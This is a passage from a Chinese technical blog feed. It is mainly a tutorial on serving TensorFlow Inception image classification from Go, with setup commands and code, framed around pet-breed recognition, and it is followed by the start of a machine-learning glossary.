<p>一个人需要最新的知识，但他也需要最基础的知识。对于基础知识，我们从未给予足够重视，我们对它采取了想当然的态度，这显然是错误的。我们要提醒自己，同时也要提醒他人，不管一个神经外科医生的医术有多么高超，他都是从人体解剖学开始学起的。</p>
<h4 id="管理是一种自由艺术"><a href="#管理是一种自由艺术" class="headerlink" title="管理是一种自由艺术"></a>管理是一种自由艺术</h4><p>在大多数商学院中，管理仍是被作为技巧讲授的，比如说如何做预算，如何促进组织发展。诚然，同其他工作一样，管理也有其自身的工具和技巧，但正如医学的精髓并不是进行尿样分析一样，管理的精髓也不是技巧或程序。管理的精髓是让知识发挥生产性作用。换句话说，管理是一种社会功能。而作为实践，管理是一种真正的自由艺术。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</title>
    <url>/2018/01/17/Machine-Learning-TensorFlow/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Machine Learning Workflow</li>
<li>Problem: 宠物分类、勋章识别、美女打分</li>
<li>Demo: Hello TensorFlow !</li>
<li>TensorFlow C library / Go binding</li>
</ul>
<span id="more"></span>
<h2 id="Machine-Learning-Workflow"><a href="#Machine-Learning-Workflow" class="headerlink" title="Machine Learning Workflow"></a>Machine Learning Workflow</h2><ul>
<li>Define the problem. What problems do you want to solve?</li>
<li>Start simple. Be familiar with the data and the baseline results.</li>
<li>Then try something more complicated.</li>
</ul>
<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>人类喜欢将所有事物都纳入鄙视链的范畴，宠物当然也不例外。一般来说，拥有一只纯种宠物可以让主人占据鄙视链的云端，进而鄙视那些混血或者流浪宠物。甚至还发展出了专业的鉴定机构，可以颁发《血统证明书》。但是考究各类纯种鉴定的常规方法，主要标准是眼睛的大小、颜色、鼻子的特点、身躯长度、尾巴特征、毛发等特征，当然也包括一些比较玄幻的属性，例如宠物家族的个性、气质等等。</p>
<p><a href="https://riboseyim.github.io/2017/04/09/Medal/">外军研究：美军授勋及嘉奖制度观察</a>一文中提到，世界各国军队都有自己的制服、军衔、勋章体系，它们既是军人荣誉的体现，也包含了丰富的职业信息。但是体系过于庞大也会带来识别困难，例如下图中的两位美军士兵，是否可以有一种方案可以自动、准确地识别各类徽章的意义呢？<br><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-Navy-Seg-Notes-1.png" alt=""></p>
<p>中文网络上有一个特殊名词：颜值。通常用来表示人物颜容英俊或靓丽的数值。人们希望有一个衡量标准可以用来评价、测量和比较人物容貌，许多社交软件甚至可以利用计算机视觉识别技术分析颜值、年龄、性别，甚至与好友一起进行颜值 PK ，当然这些软件的 “颜值” 算法总是备受争议。</p>
<ul>
<li><a href="https://www.zhihu.com/question/56607562">哪种类型算是中国式标准美女？</a></li>
</ul>
<p>其实以上三种场景本质上都是图像识别，可以概括为一种基于外观的分类（或者说“打分”）需求，接下来我试图基于机器学习的方法来解决这些问题。</p>
<h2 id="Demo-Hello-TensorFlow"><a href="#Demo-Hello-TensorFlow" class="headerlink" title="Demo: Hello TensorFlow !"></a>Demo: Hello TensorFlow !</h2><blockquote>
<p>Tensorflow is not a Machine Learning specific library, instead, is a general purpose computation library that represents computations with graphs.</p>
</blockquote>
<p>TensorFlow 开源软件库（Apache 2.0 许可证），最初由 Google Brain 团队开发。TensorFlow 提供了一系列算法模型和编程接口，让我们可以快速构建一个基于机器学习的智能服务。对于开发者来说，目前有四种编程接口可供选择：</p>
<ul>
<li>C++ source code: Tensorflow 核心基于 C++ 编写，支持从高到低各个层级的操作;</li>
<li>Python bindings &amp; Python library: 对标 C++ 实现，支持 Python 调用 C++ 函数;</li>
<li>Java bindings;</li>
<li>Go binding;</li>
</ul>
<p>下面是一个简单的实例：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensorflow-Inception-Go-C.png" alt=""></p>
<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><ul>
<li><p>安装 TensorFlow  C library,包含一个头文件 c_api.h 和 libtensorflow.so</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-cpu-linux-x86_64-1.5.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">## options</span></span><br><span class="line"><span class="comment"># Change to &quot;gpu&quot; for GPU support</span></span><br><span class="line">TF_TYPE=<span class="string">&quot;cpu&quot;</span></span><br><span class="line">TF_VERSION=<span class="string">&#x27;1.5.0&#x27;</span></span><br><span class="line">curl -L \</span><br><span class="line">  <span class="string">&quot;https://storage.googleapis.com/tensorflow/libtensorflow/libtensorflow-<span class="variable">$&#123;TF_TYPE&#125;</span>-<span class="subst">$(go env GOOS)</span>-x86_64-<span class="variable">$&#123;TF_VERSION&#125;</span>.tar.gz&quot;</span> |</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看 tensorflow 版本</span></span><br><span class="line">$ python -c <span class="string">&#x27;import tensorflow as tf; print(tf.__version__)&#x27;</span>  <span class="comment"># for Python 2</span></span><br><span class="line">$ python3 -c <span class="string">&#x27;import tensorflow as tf; print(tf.__version__)&#x27;</span>  <span class="comment"># for Python 3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 Go 语言环境,参考：<a href="https://riboseyim.github.io/2017/05/05/Language-Go-lang/">玩转编程语言：Golang</a></p>
</li>
<li><p>安装 Tensorflow Go binding library</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go get github.com/tensorflow/tensorflow/tensorflow/go</span><br><span class="line">go get github.com/tensorflow/tensorflow/tensorflow/go/op</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载模型（demo model)，包含一个标签文件 label_strings.txt 和 graph.pb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir model</span><br><span class="line">wget https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip -O model/inception.zip</span><br><span class="line">unzip model/inception.zip -d model</span><br><span class="line">chmod -R 777 model</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Tensorflow-Model-Function"><a href="#Tensorflow-Model-Function" class="headerlink" title="Tensorflow Model Function"></a>Tensorflow Model Function</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Loading TensorFlow model</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadModel</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="comment">// Load inception model</span></span><br><span class="line">  model, err := ioutil.ReadFile(<span class="string">&quot;./model/tensorflow_inception_graph.pb&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  graph = tf.NewGraph()</span><br><span class="line">  <span class="keyword">if</span> err := graph.Import(model, <span class="string">&quot;&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Load labels</span></span><br><span class="line">  labelsFile, err := os.Open(<span class="string">&quot;./model/imagenet_comp_graph_label_strings.txt&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">defer</span> labelsFile.Close()</span><br><span class="line">  scanner := bufio.NewScanner(labelsFile)</span><br><span class="line">  <span class="comment">// Labels are separated by newlines</span></span><br><span class="line">  <span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">    labels = <span class="built_in">append</span>(labels, scanner.Text())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> err := scanner.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Classifying-Workflow"><a href="#Classifying-Workflow" class="headerlink" title="Classifying Workflow"></a>Classifying Workflow</h4><p>基于 Tensorflow 模型实现图像识别的主要流程如下：</p>
<ul>
<li>图像转换 (Convert to tensor )</li>
<li>图像标准化( Normalize )</li>
<li>图像分类 （ Classifying )</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recognizeHandler</span><span class="params">(w http.ResponseWriter, r *http.Request, _ httprouter.Params)</span></span> &#123;</span><br><span class="line">  <span class="comment">// Read image</span></span><br><span class="line">  imageFile, header, err := r.FormFile(<span class="string">&quot;image&quot;</span>)</span><br><span class="line">  <span class="comment">// Will contain filename and extension</span></span><br><span class="line">  imageName := strings.Split(header.Filename, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    responseError(w, <span class="string">&quot;Could not read image&quot;</span>, http.StatusBadRequest)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">defer</span> imageFile.Close()</span><br><span class="line">  <span class="keyword">var</span> imageBuffer bytes.Buffer</span><br><span class="line">  <span class="comment">// Copy image data to a buffer</span></span><br><span class="line">  io.Copy(&amp;imageBuffer, imageFile)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  tensor, err := makeTensorFromImage(&amp;imageBuffer, imageName[:<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    responseError(w, <span class="string">&quot;Invalid image&quot;</span>, http.StatusBadRequest)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 makeTensorFromImage() which runs an image tensor through the normalization graph.<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makeTensorFromImage</span><span class="params">(imageBuffer *bytes.Buffer, imageFormat <span class="keyword">string</span>)</span> <span class="params">(*tf.Tensor, error)</span></span> &#123;</span><br><span class="line">  tensor, err := tf.NewTensor(imageBuffer.String())</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  graph, input, output, err := makeTransformImageGraph(imageFormat)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  session, err := tf.NewSession(graph, <span class="literal">nil</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">defer</span> session.Close()</span><br><span class="line">  normalized, err := session.Run(</span><br><span class="line">    <span class="keyword">map</span>[tf.Output]*tf.Tensor&#123;input: tensor&#125;,</span><br><span class="line">    []tf.Output&#123;output&#125;,</span><br><span class="line">    <span class="literal">nil</span>)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> normalized[<span class="number">0</span>], <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>函数 maketransformimagegraph() 将图形的像素值调整到 224x224，以符合模型输入参数要求。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makeTransformImageGraph</span><span class="params">(imageFormat <span class="keyword">string</span>)</span> <span class="params">(graph *tf.Graph, input, output tf.Output, err error)</span></span> &#123;</span><br><span class="line">  <span class="keyword">const</span> (</span><br><span class="line">    H, W  = <span class="number">224</span>, <span class="number">224</span></span><br><span class="line">    Mean  = <span class="keyword">float32</span>(<span class="number">117</span>)</span><br><span class="line">    Scale = <span class="keyword">float32</span>(<span class="number">1</span>)</span><br><span class="line">  )</span><br><span class="line">  s := op.NewScope()</span><br><span class="line">  input = op.Placeholder(s, tf.String)</span><br><span class="line">  <span class="comment">// Decode PNG or JPEG</span></span><br><span class="line">  <span class="keyword">var</span> decode tf.Output</span><br><span class="line">  <span class="keyword">if</span> imageFormat == <span class="string">&quot;png&quot;</span> &#123;</span><br><span class="line">    decode = op.DecodePng(s, input, op.DecodePngChannels(<span class="number">3</span>))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    decode = op.DecodeJpeg(s, input, op.DecodeJpegChannels(<span class="number">3</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Div and Sub perform (value-Mean)/Scale for each pixel</span></span><br><span class="line">  output = op.Div(s,</span><br><span class="line">    op.Sub(s,</span><br><span class="line">      <span class="comment">// Resize to 224x224 with bilinear interpolation</span></span><br><span class="line">      op.ResizeBilinear(s,</span><br><span class="line">        <span class="comment">// Create a batch containing a single image</span></span><br><span class="line">        op.ExpandDims(s,</span><br><span class="line">          <span class="comment">// Use decoded pixel values</span></span><br><span class="line">          op.Cast(s, decode, tf.Float),</span><br><span class="line">          op.Const(s.SubScope(<span class="string">&quot;make_batch&quot;</span>), <span class="keyword">int32</span>(<span class="number">0</span>))),</span><br><span class="line">        op.Const(s.SubScope(<span class="string">&quot;size&quot;</span>), []<span class="keyword">int32</span>&#123;H, W&#125;)),</span><br><span class="line">      op.Const(s.SubScope(<span class="string">&quot;mean&quot;</span>), Mean)),</span><br><span class="line">    op.Const(s.SubScope(<span class="string">&quot;scale&quot;</span>), Scale))</span><br><span class="line">  graph, err = s.Finalize()</span><br><span class="line">  <span class="keyword">return</span> graph, input, output, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，将格式化的 image tensor 输入到 Inception model graph 中运算。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">session, err := tf.NewSession(graph, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line">output, err := session.Run(</span><br><span class="line">  <span class="keyword">map</span>[tf.Output]*tf.Tensor&#123;</span><br><span class="line">    graph.Operation(<span class="string">&quot;input&quot;</span>).Output(<span class="number">0</span>): tensor,</span><br><span class="line">  &#125;,</span><br><span class="line">  []tf.Output&#123;</span><br><span class="line">    graph.Operation(<span class="string">&quot;output&quot;</span>).Output(<span class="number">0</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  responseError(w, <span class="string">&quot;Could not run inference&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> err := loadModel(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  r := httprouter.New()</span><br><span class="line">  r.POST(<span class="string">&quot;/recognize&quot;</span>, recognizeHandler)</span><br><span class="line">  err := http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Println(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensorflow-demo-Black.png" alt="识别案例：黑天鹅"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ curl localhost:<span class="number">8080</span>/recognize -F &#x27;image=@../data/IMG_3560.png&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;IMG_3000.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;labels&quot;</span>:[</span><br><span class="line">    &#123;<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;black swan&quot;</span>,<span class="attr">&quot;probability&quot;</span>:<span class="number">0.98746836</span>,<span class="attr">&quot;Percent&quot;</span>:<span class="string">&quot;98.75%&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;oystercatcher&quot;</span>,<span class="attr">&quot;probability&quot;</span>:<span class="number">0.0040768473</span>,<span class="attr">&quot;Percent&quot;</span>:<span class="string">&quot;0.41%&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;American coot&quot;</span>,<span class="attr">&quot;probability&quot;</span>:<span class="number">0.002185003</span>,<span class="attr">&quot;Percent&quot;</span>:<span class="string">&quot;0.22%&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;black stork&quot;</span>,<span class="attr">&quot;probability&quot;</span>:<span class="number">0.0011524856</span>,<span class="attr">&quot;Percent&quot;</span>:<span class="string">&quot;0.12%&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">&quot;label&quot;</span>:<span class="string">&quot;redshank&quot;</span>,<span class="attr">&quot;probability&quot;</span>:<span class="number">0.0010183558</span>,<span class="attr">&quot;Percent&quot;</span>:<span class="string">&quot;0.10%&quot;</span>&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensorflow-Demo-Dog-1.png" alt="IMG_3560.png"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensorflow-Demo-Dog-2.png" alt="IMG_3608.png"></p>
<p>通过上面的案例我们可以发现，这个服务目前可以对于黑天鹅图像的推算概率值为 98.75%，非常准确；但是对于另外两张宠物狗的图像，最高的推算概率值也仅有 30% 左右，虽然也没有被识别成猫咪或者狼，但是和理想效果要求可用性还有一段距离（此处暂时忽略物种本身的复杂性）。主要是因为现在我们使用的还只是一个非常“原始”的模型，如果需要为小众领域服务（宠物，也可以是其它事物），需要通过训练（Training Models）增强优化，或者引入更丰富的标签，更合适的模型。当然，训练过程中也会存在样本质量不佳的情况，错误样本和各种噪音也会影响准确度。</p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="How-to-Install-TensorFlow-on-CentOS-7"><a href="#How-to-Install-TensorFlow-on-CentOS-7" class="headerlink" title="How to Install TensorFlow on CentOS 7"></a>How to Install TensorFlow on CentOS 7</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. To enable the repository, install the SCL release file:</span></span><br><span class="line"></span><br><span class="line">$ sudo yum install centos-release-scl</span><br><span class="line">$ sudo yum install rh-python36</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Creating a Virtual Environment</span></span><br><span class="line"><span class="comment"># To access Python 3.6 you need to launch a new shell instance using the scl tool:</span></span><br><span class="line">$ scl <span class="built_in">enable</span> rh-python36 bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a new directory for the TensorFlow project and cd into it:</span></span><br><span class="line">$ mkdir tensorflow_project</span><br><span class="line">$ <span class="built_in">cd</span> tensorflow_project</span><br><span class="line">$ python3 -m venv venv</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upgrade pip to the latest version to avoid issues when installing packages:</span></span><br><span class="line">$ pip install --upgrade pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Installing TensorFlow</span></span><br><span class="line">$ pip install --upgrade tensorflow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. To verify the installation</span></span><br><span class="line">$ python -c <span class="string">&#x27;import tensorflow as tf; print(tf.__version__)&#x27;</span></span><br><span class="line"></span><br><span class="line">At the time of writing this article, the latest stable version of TensorFlow is 1.13.1</span><br><span class="line"><span class="comment"># 5. Once you are done with your work, deactivate the environment, by typing deactivate and you will return to your normal shell.</span></span><br><span class="line">$ deactivate</span><br></pre></td></tr></table></figure>
<h2 id="Lessons"><a href="#Lessons" class="headerlink" title="Lessons"></a>Lessons</h2><ul>
<li><a href="https://morioh.com/p/d669c3deea75/deep-learning-with-tensorflow-2-0">Deep Learning With TensorFlow 2.0</a></li>
<li><a href="https://developers.google.com/machine-learning/crash-course/">Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><p><a href="https://www.tensorflow.org/tutorials/image_retraining">How to Retrain Inception’s Final Layer for New Categories</a></p>
</li>
<li><p><a href="https://www.kdnuggets.com/2017/12/getting-started-tensorflow.html">Getting Started with TensorFlow: A Machine Learning Tutorial</a></p>
</li>
<li><p><strong>Youtube</strong><a href="https://www.youtube.com/watch?v=FQ660T4uu7k">Introduction To TensorFlow</a></p>
</li>
<li><p><a href="https://medium.com/initialized-capital/we-need-to-go-deeper-a-practical-guide-to-tensorflow-and-inception-50e66281804f">We Need to Go Deeper: A Practical Guide to Tensorflow and Inception</a></p>
</li>
<li><p><a href="https://www.tensorflow.org/tutorials/image_recognition">Tensorflow.org: Image Recognition</a></p>
<blockquote>
<p>We know that label 866 (military uniform) should be the top label for the Admiral Hopper image.</p>
</blockquote>
</li>
</ul>
<h2 id="扩展阅读-1"><a href="#扩展阅读-1" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://linuxize.com/post/how-to-install-tensorflow-on-centos-7/">How to Install TensorFlow on CentOS 7</a></li>
<li><a href="https://github.com/sjwhitworth/golearn">GoLearn</a></li>
<li><a href="https://pgaleone.eu/tensorflow/go/2017/05/29/understanding-tensorflow-using-go/">Understanding Tensorflow using Go</a></li>
<li><a href="https://nilsmagnus.github.io/post/go-tensorflow/">Using your tensorflow model with go</a></li>
<li><a href="https://outcrawl.com/image-recognition-api-go-tensorflow/">Build an Image Recognition API with Go and TensorFlow</a></li>
<li><a href="http://vividfree.github.io/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/2017/04/13/install-tensorflow-on-linux-from-sources">以源码方式在Linux安装TensorFlow记录</a></li>
<li><a href="http://www.infoq.com/cn/articles/tensorflow-architecture-and-programming?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">TensorFlow系统架构及高性能程序设计</a></li>
<li><a href="http://www.infoq.com/cn/news/2017/02/Spark-Yahoo-TensorFlowOnSpark?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">Yahoo开源TensorFlowOnSpark</a></li>
<li><a href="https://www.leiphone.com/news/201702/T5e31Y2ZpeG1ZtaN.html">TensorFlow和Caffe、MXNet、Keras等其他深度学习框架的对比</a></li>
<li><a href="http://chenrudan.github.io/blog/2017/02/25/comparetfmxpd.html">TensorFlow、MXNet、PaddlePaddle三个开源库对比</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning:WordBook</title>
    <url>/2018/03/21/Machine-Learning-WordBook/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h2 id="数学概念"><a href="#数学概念" class="headerlink" title="数学概念"></a>数学概念</h2><ul>
<li>泰勒级数 Taylor series</li>
</ul>
<p>用无限项连加式——级数来表示一个函数，这些相加的项由函数在某一点的导数求得，以 1715 年发表了泰勒公式的英国数学家布鲁克·泰勒（Sir Brook Taylor）来命名。通过函数在自变量零点的导数求得的泰勒级数又叫做麦克劳林级数，以苏格兰数学家科林·麦克劳林的名字命名。</p>
<ul>
<li>导数 Derivative</li>
</ul>
<p>导数（Derivative）是微积分学中重要的基础概念。一个函数在某一点的导数描述了这个函数在这一点附近的变化率。导数的本质是通过极限的概念对函数进行局部的线性逼近。</p>
<ul>
<li>偏导数 Partial Derivatives</li>
</ul>
<p>在数学中，一个多变量的函数的偏导数是它关于其中一个变量的导数，而保持其他变量恒定（相对于全导数，在其中所有变量都允许变化）</p>
<ul>
<li>超参数 Hyper Parameter</li>
</ul>
<p>在机器学习中，超参数是在学习过程开始之前设置的一个参数。相比之下，其他参数的值是通过训练得到的。</p>
<p>不同的模型训练算法需要不同的超参数，一些简单的算法（如普通最小二乘回归）不需要。给定这些超参数，训练算法从数据中学习参数。例如，LASSO 是一种算法，将正则化超参数添加到普通最小二乘回归中，它必须在通过训练算法估计参数之前设置。在深度学习中，常见的超参数有：学习速率，迭代次数，层数，每层神经元的个数等。</p>
<ul>
<li>激活函数 Activation Function</li>
</ul>
<p>在 计算网络中， 一个节点的激活函数定义了该节点在给定的输入或输入的集合下的输出</p>
<h2 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h2><h4 id="Neural-Network"><a href="#Neural-Network" class="headerlink" title="Neural Network"></a>Neural Network</h4><ul>
<li>神经网络（Neural Network，缩写 NN）</li>
<li>人工神经网络（Artificial Neural Network，缩写 ANN）</li>
</ul>
<p>人工神经网络（Artificial neural network，缩写ANN），简称神经网络（neural network，缩写NN）或类神经网络，是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型。神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统。现代神经网络是一种非线性统计性数据建模工具，常用来对输入和输出间复杂的关系进行建模，或用来探索数据的模式。</p>
<h4 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h4><ul>
<li>卷积神经网络(Convolutional Neural Network,缩写 CNN )<br>In machine learning, a convolutional neural network (CNN, or ConvNet) is a type of feed-forward artificial neural network in which the connectivity pattern between its neurons is inspired by the organization of the animal visual cortex, whose individual neurons are arranged in such a way that they respond to overlapping regions tiling the visual field. Convolutional networks were inspired by biological processes and are variations of multilayer perceptrons designed to use minimal amounts of preprocessing. They have wide applications in image and video recognition, recommender systems and natural language processing.</li>
</ul>
<h4 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h4><ul>
<li>RNN 一般指代时间递归神经网络(Recurrent Neural Network)</li>
<li>结构递归神经网络(Recursive Neural Network)</li>
</ul>
